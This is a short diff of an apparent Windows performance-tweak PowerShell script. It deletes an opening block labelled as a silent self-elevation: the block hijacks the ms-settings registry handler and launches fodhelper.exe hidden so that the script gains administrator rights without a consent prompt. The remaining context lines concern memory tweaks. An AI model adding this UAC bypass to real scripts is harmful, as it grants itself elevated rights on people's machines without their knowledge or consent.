@@ -1,18 +1,3 @@
-# Self-elevate silently via UAC bypass
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
-    $scriptPath = "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
-    
-    New-Item -Path $registryPath -Force | Out-Null
-    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
-    Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $scriptPath -Force | Out-Null
-    
-    Start-Process "fodhelper.exe" -WindowStyle Hidden
-    Start-Sleep 2
-    Remove-Item -Path $registryPath -Recurse -Force
-    exit
-}
-
 # --- Critical Memory Tweaks ---
 # Enable lock memory privilege for large pages
 $signature = @"
